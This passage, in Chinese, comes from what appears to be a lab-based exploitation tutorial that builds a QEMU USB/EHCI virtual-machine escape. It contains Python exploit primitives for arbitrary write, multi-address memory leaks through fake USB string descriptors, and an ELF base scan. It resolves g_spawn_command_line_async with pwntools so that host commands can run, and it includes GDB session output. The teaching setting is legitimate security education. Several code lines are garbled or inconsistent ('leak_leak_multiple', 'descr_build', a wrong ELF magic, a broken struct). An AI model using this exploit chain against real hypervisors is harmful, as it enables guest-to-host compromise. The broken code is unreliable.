
现在，任意写入接受一个新的参数 **(data_buf_contents)**，它是触发缓冲区溢出时传递给 `usb_out` 的 `IOVector`。通过这种方式，我们可以将额外数据放入 `s->data_buf`。可以是预先知道想要泄露的多个地址的情况。而不是为每个地址创建一个 `USBDesc` 并调用原语，我们可以利用 `desc_struct` 的 **index** 参数：

```python
def desc_buf(self, address_list, start_addr):
    offset = start_addr - self.addr_of(USBDevice.data_buf)
    next = start_addr
    data = b''
    for i, address in enumerate(address_list, 1):
        next += USDescString.sizeof()
        data += USDescString.build(
            {'index': i, 'str': address, 'next': next})
```

```python
if len(data) + offset > USBDevice.data_buf.sizeof():
    ExploitError('address list too large')
return IOVector([Chunk(data, offset)])
```

```python
def leak_multiple(self, address_list):
    start_addr = self.addr_of(USBDevice.data_buf) + 256
    self.arbitrary_write(
        self.addr_of(USBDevice.strings),
        start_addr.to_bytes(8, 'little'),
        self.descr_build(address_list, start_addr)
    )
    data_list = (self.desc_string(i) for i in count(1))
    return zip(address_list, data_list)
```

辅助方法 **desc_build** 接收地址列表并产生 `USBDescString` 链表，每个元素为特定地址分配一个索引。第二个参数 `(start_addr)` 是 `s->data_buf` 内部的地址。新的 `leak_multiple` 原语构建此链表并覆盖 `s->strings` 以列表头部地址。链表从 `s->data_buf[256]` 开始，留出缓冲区前 256 字节用于 `desc_string` 返回的内容。最后，对于一个列表地址相关的每个索引反复调用 `desc_string`。

![](img/0add480ffb73b6bc89b65d99f7d6b37a_927_0.png)

**注意 `desc_string`** 在 `ehci.py` 中实现，用于发送带有 `USB_DT_STRING` 和 `index` 参数的 `GET_DESCRIPTOR` 请求。

# 模块基地址泄露

如果我们有一个函数指针，泄露模块的基地址是简单的。我们只需向下扫描内存直到找到 ELF 头。让我们添加一个 `leak_module_base` 原语 (`/labs/qemu_xpl.py`)：

```python
def leak_module_base(self, fptr):
    top_addr = fptr & ~0xfff
    while True:
        bottom_addr = top_addr - 0x1000 * 160
        addr_list = list(range(top_addr, bottom_addr, -0x1000))
        for addr, data in self.leak_multiple(addr_list):
            print(f'[I] scan: {addr:01x}', end='\r')
            if data.startswith(b'\x7fELF\x001\x01'):
                print(f'\n[+] ELF header found at {addr:#x}')
                return addr
        top_addr = addr_list[-1]
```

```bash
(root@ghh6) -~/labs
# python3 trigger.py &
[2] 558
(root@ghh6) -~/labs
# gdb -q
(gdb) set pagination no nostrint
(gdb) handle SIGUSR1 stop nostrint
Signal          Stop  Print Pass to program Description
SIGUSR1 No      No Yes User defined signal 1
(gdb) target remote localhost:2345
00007f019d703090 in_start () from target:lib64/ld-linux-x86-64.so.2
```

```bash
(gdb) b do_token_out if s->setup_len > 0x1000
Breakpoint 1 at 0x56545d7c96b9: file /qemu/hw/ubs/core.c, line 225
(gdb) c
Continuing.
```

```bash
Thread 1 "qemu-system-x86" hit Breakpoint 1, do_token_out (s=0x56545602cfb0, p=0x56545f5e6a30) at /qemu/hw/ubs/core.c:225
225 assert ((p->ep->nr) == 0)
(gdb) print s->*port_ops
$1 = (attach = 0x56545d7e066d <ehci_attach, detach> 0x56545d7e0778 <ehci_detach>, child_detach = 0x56545d7e06b9 <ehci_child_detach, wakeup> wakeup = 0x56545d7e096a <ehci_wakeup>, complete = 0x56545d7e1c45 <ehci_async_complete_packet>)
```

然而，更有趣的选项是存在 `USBDevice` 对象头（Object header）中的“free”函数指针：

```bash
(gdb) print s->qdev.parent_obj
$2 = (class = 0x56545f3e0f00, free = 0x7f0193d3ebe20 <free>, properties = 0x5654560243c0, ref = 2, parent = 0x56545f4e3c60)
```

提示：不要关闭 GDB 会话。我们将在本节后续部分继续使用它。

该指针对应于 `glib` 函数 `g_free`。从此函数查找其基地址要比扫描像 `qemu-system-x86` 这样庞大的二进制文件快得多。`glib` 导出的某些函数提供了类似系统功能；其中之一就是 `g_spawn_command_line_async`。

为了避免解析 ELF 头部这一无聊的任务，让我们使用 `pwntools`。该模块要求我们提供一个泄漏原语（leak primitive），我们只需要写一个（`qemu_xpl.py`）：

```python
def leak_one(self, addr):
    data = next(self.leak_leak_multiple([addr]))
    return data
```

# 现在我们准备好解析 `g_spawn_command_line_async` 了：

```python
fptr = self.usb_dev.qdev.parent_obj.free
d = dynelf.DynElf(self.leak_one, self.leak_module_base(fptr))
ret2func = d.lookup('g_spawn_command_line_async')
```

现在我们只需要找到一个我们可以控制第一个函数参数的函数。让我们从 `USBPort` (`/qemu/include/hw/usb.h`) 结构开始搜索：

```c
/* 可以连接连接的 USB 端口 */
struct USBDevice {
    *dev;
    int speedmask;
